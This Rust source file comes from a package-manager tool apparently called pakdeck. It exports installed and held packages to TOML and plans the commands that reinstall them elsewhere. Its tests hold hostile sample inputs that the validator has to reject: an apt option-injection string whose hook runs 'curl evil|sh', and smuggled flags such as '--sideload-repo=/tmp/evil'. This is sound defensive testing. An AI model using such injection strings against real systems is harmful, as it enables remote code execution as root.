//! Export the explicitly installed (and held) packages of every active
//! package manager to a TOML file, and plan the commands that recreate
//! them on another machine.
//!
//! ```toml
//! [brew]
//! packages = ["ripgrep", "graykode/tap/abtop"]
//! casks = ["firefox"]
//! held = ["node"]
//!
//! [flatpak]
//! packages = ["org.mozilla.firefox"]
//! ```

use crate::backend::{Backend, Cmd, Multi, Package, is_unsupported, validate_name};
use anyhow::{Context, Result};
use serde::{Deserialize, Serialize};
use std::collections::{BTreeMap, HashSet};

#[derive(Debug, Default, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct Entry {
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub packages: Vec<String>,
    /// Homebrew casks (other managers have no such distinction).
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub casks: Vec<String>,
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub held: Vec<String>,
}

pub type PackageList = BTreeMap<String, Entry>;

/// One package manager's entry: explicit packages (all installed ones when
/// the manager cannot tell) and held packages, plus notes about holds that
/// could not be read.
fn entry(b: &dyn Backend) -> Result<(Entry, Vec<String>)> {
    let installed = b.installed()?;
    let explicit: Option<HashSet<String>> = match b.explicit() {
        Ok(v) => Some(v.into_iter().collect()),
        Err(e) if is_unsupported(&e) => None,
        Err(e) => return Err(e),
    };
    let mut e = Entry::default();
    let mut notes = Vec::new();
    for p in installed
        .iter()
        .filter(|p| explicit.as_ref().is_none_or(|x| x.contains(&p.name)))
    {
        if p.repo == "cask" {
            e.casks.push(b.export_name(p));
        } else {
            e.packages.push(b.export_name(p));
        }
    }
    match b.held() {
        Ok(held) => e.held = held,
        Err(err) if is_unsupported(&err) => {}
        Err(err) => notes.push(format!("{}: holds not exported: {err:#}", b.name())),
    }
    e.packages.sort();
    e.casks.sort();
    e.held.sort();
    Ok((e, notes))
}

/// TOML for every active package manager, plus notes about any that failed.
pub fn export(multi: &Multi) -> Result<(String, Vec<String>)> {
    let mut list = PackageList::new();
    let mut notes = Vec::new();
    for b in multi.parts() {
        match entry(b.as_ref()) {
            Ok((e, extra)) => {
                notes.push(format!(
                    "{}: {} packages{}",
                    b.name(),
                    e.packages.len().saturating_add(e.casks.len()),
                    if e.held.is_empty() {
                        String::new()
                    } else {
                        format!(", {} held", e.held.len())
                    }
                ));
                notes.extend(extra);
                list.insert(b.name().to_string(), e);
            }
            Err(err) => notes.push(format!("{}: not exported: {err:#}", b.name())),
        }
    }
    let body = toml::to_string_pretty(&list).context("serializing the package list")?;
    let text = format!(
        "# pakdeck package list (pakdeck {}). Import with `pakdeck --import FILE` or I in the TUI.\n\n{body}",
        env!("CARGO_PKG_VERSION")
    );
    Ok((text, notes))
}

/// Parse a package list. Every entry is checked with `validate_name`: the
/// file may come from another machine, and its names end up as arguments
/// of commands that run as root.
pub fn parse(text: &str) -> Result<PackageList> {
    let list: PackageList = toml::from_str(text).context("parsing the package list")?;
    for (manager, e) in &list {
        for name in e.packages.iter().chain(&e.casks).chain(&e.held) {
            validate_name(name).with_context(|| format!("[{manager}]"))?;
        }
    }
    Ok(list)
}

/// Commands that install what is missing and hold what should be held,
/// for the package managers that are active here; notes explain the rest.
pub fn plan(multi: &Multi, list: &PackageList) -> (Vec<Cmd>, Vec<String>) {
    let mut cmds = Vec::new();
    let mut notes = Vec::new();
    for (name, e) in list {
        let Some(b) = multi.parts().iter().find(|b| b.name() == name) else {
            notes.push(format!("{name}: skipped (not an active package manager here)"));
            continue;
        };
        let installed = match b.installed() {
            Ok(v) => v,
            Err(err) => {
                notes.push(format!("{name}: skipped: {err:#}"));
                continue;
            }
        };
        let have: HashSet<&str> = installed.iter().map(|p| p.name.as_str()).collect();
        let mut wanted = Vec::new();
        for entry in &e.packages {
            match checked_import(b.as_ref(), entry) {
                Ok(p) => wanted.push(p),
                Err(err) => notes.push(format!("{name}: skipped {entry:?}: {err:#}")),
            }
        }
        wanted.extend(e.casks.iter().map(|n| Package::new(n.as_str(), "").repo("cask")));
        let missing: Vec<Package> = wanted
            .into_iter()
            .filter(|p| !have.contains(p.name.as_str()))
            .map(|p| p.source(name.as_str()))
            .collect();
        if !missing.is_empty() {
            notes.push(format!("{name}: {} to install", missing.len()));
            cmds.extend(b.install(&missing));
        }
        let already: HashSet<String> = match b.held() {
            Ok(v) => v.into_iter().collect(),
            Err(err) if is_unsupported(&err) => HashSet::new(),
            Err(err) => {
                notes.push(format!("{name}: cannot read holds: {err:#}"));
                HashSet::new()
            }
        };
        let to_hold: Vec<Package> = e
            .held
            .iter()
            .filter(|n| !already.contains(*n))
            .map(|n| {
                let version = installed
                    .iter()
                    .find(|p| &p.name == n)
                    .map(|p| p.version.clone())
                    .unwrap_or_default();
                Package::new(n.as_str(), version).source(name.as_str())
            })
            .collect();
        if !to_hold.is_empty() {
            match b.hold(&to_hold, true) {
                Ok(c) => cmds.extend(c),
                Err(err) => notes.push(format!("{name}: cannot hold {}: {err:#}", names(&to_hold))),
            }
        }
        if missing.is_empty() && to_hold.is_empty() {
            notes.push(format!("{name}: nothing to do"));
        }
    }
    (cmds, notes)
}

/// Decode an entry with the backend's `import_package`, then validate what
/// it produced: an encoded entry such as flatpak's `remote:id` passes
/// `validate_name` as a whole, but its parts become separate arguments.
pub fn checked_import(b: &dyn Backend, entry: &str) -> Result<Package> {
    let p = b.import_package(entry);
    validate_name(&p.name)?;
    if !p.repo.is_empty() {
        validate_name(&p.repo)?;
    }
    Ok(p)
}

fn names(p: &[Package]) -> String {
    p.iter().map(|p| p.name.as_str()).collect::<Vec<_>>().join(", ")
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::testing::Mock;
    use std::sync::Arc;

    #[test]
    fn round_trip_and_plan() {
        let here = Multi::new(vec![Arc::new(Mock::named("one"))]);
        let (text, notes) = export(&here).unwrap();
        assert!(text.contains("[one]"), "{text}");
        assert!(notes[0].starts_with("one: 25 packages, 1 held"), "{notes:?}");
        let list = parse(&text).unwrap();
        assert_eq!(list["one"].packages.len(), 25);
        assert_eq!(list["one"].held, ["pkg03"]);

        // Same machine: nothing to install, held already held.
        let (cmds, notes) = plan(&here, &list);
        assert!(cmds.is_empty(), "{cmds:?}");
        assert_eq!(notes, ["one: nothing to do"]);

        // Elsewhere: a package missing, a hold missing, an unknown manager.
        let mut list = list;
        list.get_mut("one").unwrap().packages.push("newpkg".into());
        list.get_mut("one").unwrap().held.push("pkg04".into());
        list.insert(
            "two".into(),
            Entry {
                packages: vec!["x".into()],
                ..Entry::default()
            },
        );
        let (cmds, notes) = plan(&here, &list);
        let shown: Vec<String> = cmds.iter().map(|c| c.display(None)).collect();
        assert_eq!(shown, ["one install newpkg", "one hold pkg04"]);
        assert!(notes.iter().any(|n| n.starts_with("two: skipped")), "{notes:?}");
    }

    #[test]
    fn rejects_option_injection() {
        for bad in [
            "-oDPkg::Pre-Invoke::=sh -c 'curl evil|sh'",
            "--config=/tmp/x",
            "two words",
            "tab\there",
            "",
            "new\nline",
        ] {
            let text = format!("[apt]\npackages = [{bad:?}]\n");
            assert!(parse(&text).is_err(), "accepted {bad:?}");
            let held = format!("[apt]\nheld = [{bad:?}]\n");
            assert!(parse(&held).is_err(), "accepted held {bad:?}");
        }
        let ok = parse(
            "[brew]\npackages = [\"graykode/tap/abtop\", \"lua@5.4\", \"g++\"]\n[flatpak]\npackages = [\"flathub:org.mozilla.firefox\"]\n",
        );
        assert!(ok.is_ok(), "{ok:?}");
    }

    #[test]
    fn encoded_entries_are_checked_after_decoding() {
        let flatpak = crate::backend::by_name("flatpak").unwrap();
        for bad in ["flathub:--sideload-repo=/tmp/evil", "flathub:-y", "--x:org.a.B"] {
            assert!(checked_import(flatpak.as_ref(), bad).is_err(), "accepted {bad:?}");
        }
        let ok = checked_import(flatpak.as_ref(), "flathub:org.mozilla.firefox").unwrap();
        assert_eq!((ok.repo.as_str(), ok.name.as_str()), ("flathub", "org.mozilla.firefox"));
        let snap = crate::backend::by_name("snap").unwrap();
        assert!(checked_import(snap.as_ref(), "code:classic").is_ok());
    }

    #[test]
    fn rejects_unknown_keys() {
        assert!(parse("[brew]\npackages = [\"a\"]\nbogus = 1\n").is_err());
        assert_eq!(
            parse("[brew]\ncasks = [\"firefox\"]\n").unwrap()["brew"].casks,
            ["firefox"]
        );
    }
}
